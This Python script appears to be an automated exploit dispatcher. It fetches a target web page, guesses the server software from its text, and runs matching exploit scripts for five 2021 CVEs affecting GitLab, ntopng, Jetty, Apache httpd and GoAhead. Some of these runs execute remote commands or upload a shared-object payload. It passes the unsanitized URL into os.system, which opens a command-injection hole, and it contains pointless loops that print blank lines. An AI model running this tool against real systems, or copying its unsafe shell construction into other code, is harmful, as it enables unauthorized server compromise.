import os
import requests
import urllib.request
import sys
import time


url = ""
url = sys.argv[1]
for i in range(0,10):
    print("  ")
    for i in range(0,10):
        print(" ")
        for i in range(0,10):
            print(" ")

for i in range(0,10):
    print("  ")
    for i in range(0,10):
        print(" ")
        for i in range(0,10):
            print(" ")

for i in range(0,10):
    print("  ")
    for i in range(0,10):
        print(" ")
        for i in range(0,10):
            print(" ")

for i in range(0,10):
    print("  ")
    for i in range(0,10):
        print(" ")
        for i in range(0,10):
            print(" ")

try:
    fp = urllib.request.urlopen(url)
    mybytes = fp.read()
    html = mybytes.decode("utf8")
    fp.close()
    print("html",html)
except Exception as e:
    print(e)
    html = url

if "gitlab" in html:
    print("CVE-2021-22205")
    os.system("python3 cve-2021-22205.py "+url+" touch /tmp/success")

elif "ntopng" in html:
    print("CVE-2021-28073")
    os.system("python3 cve-2021-28073.py --url "+url+"/ baselength")
    os.system("python3 cve-2021-28073.py --url "+url+"/ generate -l 36 -p find_prefs.lua")

elif "Example Domain" in html:
    print("CVE-2021-28164")
    os.system("python3 cve-2021-28164.py "+url+"")

elif "It works" in html:
    print("CVE-2021-42013")
    os.system("python3 cve-2021-42013.py "+url+"")

elif "Congratulations! The server is up and running." in html:
    print("CVE-2021-42342")
    os.system("python3 cve-2021-42342.py "+url+"/cgi-bin/index CVE-2021-42342/payload.so")

else:
    print("else",url,"end")
    os.system("python3 ping.py "+url+"")
